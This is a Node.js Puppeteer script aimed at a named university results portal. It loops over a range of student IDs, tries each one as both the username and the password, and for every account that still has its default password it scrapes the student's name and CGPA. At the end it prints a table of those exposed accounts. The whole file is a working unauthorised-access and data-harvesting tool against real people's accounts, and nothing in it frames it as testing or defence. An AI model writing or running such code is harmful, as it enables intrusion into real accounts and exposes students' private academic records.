const puppeteer = require("puppeteer");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const startId = 1061;
const endId = 1200;

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setDefaultNavigationTimeout(60000); // set global 60s timeout

    const unchanged = [];

    for (let i = startId; i <= endId; i++) {
        const userId = `CSE23012${String(i).padStart(3, "0")}`;
        console.log(`🔍 Trying: ${userId}`);

        try {
            // Go to login page
            await page.goto(`${baseUrl}/login`, { waitUntil: "networkidle2", timeout: 60000 });

            // Fill and submit login form
            await page.type("#username", userId);
            await page.type("#password", userId);
            await Promise.all([
                page.click("button[type=submit]"),
                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 60000 }),
            ]);

            // Check if login was successful
            if (page.url().includes("panel")) {
                console.log(`✅ Login success: ${userId}`);

                // Visit overall result page
                await page.goto(`${baseUrl}/panel/overallresult`, {
                    waitUntil: "networkidle2",
                    timeout: 60000,
                });

                // Extract name and CGPA
                const data = await page.evaluate(() => {
                    const nameCell = [...document.querySelectorAll("td")]
                        .find(td => td.textContent.trim().match(/^[A-Za-z\s\.]+$/));
                    const cgpaCell = [...document.querySelectorAll("b")]
                        .find(b => b.textContent.match(/^\d+\.\d{1,3}$/));
                    return {
                        name: nameCell?.textContent?.trim() || "Unknown",
                        cgpa: cgpaCell?.textContent?.trim() || "N/A"
                    };
                });

                unchanged.push({ id: userId, ...data });

                // Sign out
                await page.goto(`${baseUrl}/login/signout`, {
                    waitUntil: "networkidle2",
                    timeout: 60000,
                });
            } else {
                console.log(`❌ Login failed: ${userId}`);
            }

        } catch (err) {
            console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
        }
    }

    await browser.close();

    console.log("\n📋 Final Report:");
    console.table(unchanged);
})();
